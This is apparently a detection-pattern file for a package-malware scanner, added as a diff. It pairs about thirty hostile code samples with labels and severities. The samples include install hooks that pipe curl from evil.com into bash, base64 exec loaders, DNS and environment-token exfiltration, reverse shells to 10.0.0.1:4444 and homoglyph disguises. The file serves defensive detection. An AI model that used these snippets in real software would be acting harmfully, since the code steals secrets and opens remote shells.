@@ -1,0 +1,302 @@
+{
+  "patterns": [
+    {
+      "id": "py_setup_install_hook",
+      "code": "class PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        os.system('curl http://evil.com/payload | bash')\n",
+      "finding": {
+        "label": "setup.py custom install command",
+        "category": "install_hook",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_setup_develop_hook",
+      "code": "class PostDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        exec(base64.b64decode(PAYLOAD))\n",
+      "finding": {
+        "label": "setup.py custom develop command",
+        "category": "install_hook",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_b64_exec",
+      "code": "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgLi4uJyk='))",
+      "finding": {
+        "label": "Base64-encoded exec payload",
+        "category": "dynamic_execution",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_eval_compile",
+      "code": "eval(compile(base64.b64decode(data), '<string>', 'exec'))",
+      "finding": {
+        "label": "eval(compile(...)) obfuscation",
+        "category": "dynamic_execution",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_concat_eval",
+      "code": "eval('__imp' + 'ort__' + \"('os')\" + '.sys' + 'tem(cmd)')",
+      "finding": {
+        "label": "String concatenation to build eval argument",
+        "category": "dynamic_execution",
+        "language": "python",
+        "severity": "HIGH"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_chr_obfuscation",
+      "code": "getattr(__builtins__, ''.join([chr(101),chr(118),chr(97),chr(108)]))(payload)",
+      "finding": {
+        "label": "chr() obfuscation to build function names",
+        "category": "dynamic_execution",
+        "language": "python",
+        "severity": "HIGH"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_dunder_import",
+      "code": "__import__('subprocess').check_output(['whoami'])",
+      "finding": {
+        "label": "__import__ dynamic import",
+        "category": "obfuscated_import",
+        "language": "python",
+        "severity": "HIGH"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_except_exec",
+      "code": "try:\n    x = 1/0\nexcept:\n    exec(base64.b64decode(payload))\n",
+      "finding": {
+        "label": "Dangerous call in bare except handler",
+        "category": "hidden_execution",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_atexit_payload",
+      "code": "import atexit\ndef cleanup():\n    os.system('curl http://evil.com/exfil?data=' + encoded_data)\natexit.register(cleanup)\n",
+      "finding": {
+        "label": "atexit handler with payload",
+        "category": "hidden_execution",
+        "language": "python",
+        "severity": "HIGH"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_del_destructor",
+      "code": "class Backdoor:\n    def __del__(self):\n        exec(self._encoded_payload)\n",
+      "finding": {
+        "label": "__del__ destructor with payload",
+        "category": "hidden_execution",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_dns_exfil",
+      "code": "import socket\ndata = base64.b64encode(open('/etc/passwd').read().encode())\nsocket.getaddrinfo(data.decode() + '.evil.com', 80)\n",
+      "finding": {
+        "label": "DNS-based data exfiltration",
+        "category": "exfiltration",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_env_exfil",
+      "code": "import os, requests\ntokens = {k: v for k, v in os.environ.items() if 'TOKEN' in k or 'KEY' in k}\nrequests.post('https://evil.com/collect', json=tokens)\n",
+      "finding": {
+        "label": "Environment variable exfiltration",
+        "category": "exfiltration",
+        "language": "python",
+        "severity": "HIGH"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_reverse_shell",
+      "code": "import socket,subprocess,os\ns=socket.socket()\ns.connect(('10.0.0.1',4444))\nos.dup2(s.fileno(),0)\nsubprocess.call(['/bin/sh','-i'])\n",
+      "finding": {
+        "label": "Python reverse shell",
+        "category": "reverse_shell",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "js_preinstall",
+      "code": "\"preinstall\": \"node -e \\\"require('child_process').exec('curl http://evil.com | sh')\\\"\"",
+      "finding": {
+        "label": "npm preinstall script with command execution",
+        "category": "install_hook",
+        "language": "javascript",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "js_postinstall",
+      "code": "\"postinstall\": \"node -e \\\"const{exec}=require('child_process');\nexec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')\\\"\"",
+      "finding": {
+        "label": "npm postinstall reverse shell",
+        "category": "install_hook",
+        "language": "javascript",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "js_eval_atob",
+      "code": "eval(atob('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgLi4uIik='))",
+      "finding": {
+        "label": "eval(atob(...)) base64 execution",
+        "category": "dynamic_execution",
+        "language": "javascript",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "js_function_constructor",
+      "code": "new Function(Buffer.from(encoded, 'base64').toString())()",
+      "finding": {
+        "label": "new Function() dynamic code execution",
+        "category": "dynamic_execution",
+        "language": "javascript",
+        "severity": "HIGH"
+      },
+      "embedding": null
+    },
+    {
+      "id": "js_child_process",
+      "code": "require('child_process').exec('curl http://evil.com/payload.sh | bash')",
+      "finding": {
+        "label": "child_process exec with external command",
+        "category": "code_execution",
+        "language": "javascript",
+        "severity": "HIGH"
+      },
+      "embedding": null
+    },
+    {
+      "id": "js_process_exit",
+      "code": "process.on('exit', () => {\n  require('child_process').execSync('curl http://evil.com/exfil');\n});\n",
+      "finding": {
+        "label": "process.on exit handler with payload",
+        "category": "hidden_execution",
+        "language": "javascript",
+        "severity": "HIGH"
+      },
+      "embedding": null
+    },
+    {
+      "id": "js_dns_exfil",
+      "code": "const dns = require('dns');\nconst data = Buffer.from(JSON.stringify(process.env)).toString('hex');\ndns.resolve(data.slice(0,60) + '.evil.com', () => {});\n",
+      "finding": {
+        "label": "DNS-based data exfiltration via Node.js",
+        "category": "exfiltration",
+        "language": "javascript",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "go_exec_command",
+      "code": "exec.Command(\"/bin/sh\", \"-c\", payload).Run()",
+      "finding": {
+        "label": "os/exec.Command with shell",
+        "category": "code_execution",
+        "language": "go",
+        "severity": "HIGH"
+      },
+      "embedding": null
+    },
+    {
+      "id": "go_init_backdoor",
+      "code": "func init() {\n    exec.Command(\"bash\", \"-c\", decoded).Start()\n}\n",
+      "finding": {
+        "label": "init() function with hidden execution",
+        "category": "hidden_execution",
+        "language": "go",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "rs_command_exec",
+      "code": "Command::new(\"sh\").arg(\"-c\").arg(&payload).output()",
+      "finding": {
+        "label": "Command::new with shell execution",
+        "category": "code_execution",
+        "language": "rust",
+        "severity": "HIGH"
+      },
+      "embedding": null
+    },
+    {
+      "id": "rs_build_script",
+      "code": "fn main() {\n    std::process::Command::new(\"curl\")\n        .arg(\"http://evil.com/payload\")\n        .output()\n        .expect(\"failed\");\n}\n",
+      "finding": {
+        "label": "build.rs with command execution",
+        "category": "install_hook",
+        "language": "rust",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "homoglyph_function",
+      "code": "def \u043erganize_data():\n    # Cyrillic '\u043e' in 'organize'\n    exec(payload)\n",
+      "finding": {
+        "label": "Cyrillic homoglyph in function name",
+        "category": "homoglyph",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "homoglyph_import",
+      "code": "import \u043es  # Cyrillic '\u043e' instead of Latin 'o' in 'os'\n",
+      "finding": {
+        "label": "Cyrillic homoglyph in module name",
+        "category": "homoglyph",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    },
+    {
+      "id": "py_pickle_rce",
+      "code": "import pickle, base64\npayload = base64.b64decode(encoded_data)\npickle.loads(payload)\n",
+      "finding": {
+        "label": "Pickle deserialization RCE",
+        "category": "deserialization",
+        "language": "python",
+        "severity": "CRITICAL"
+      },
+      "embedding": null
+    }
+  ],
+  "version": 1
+}
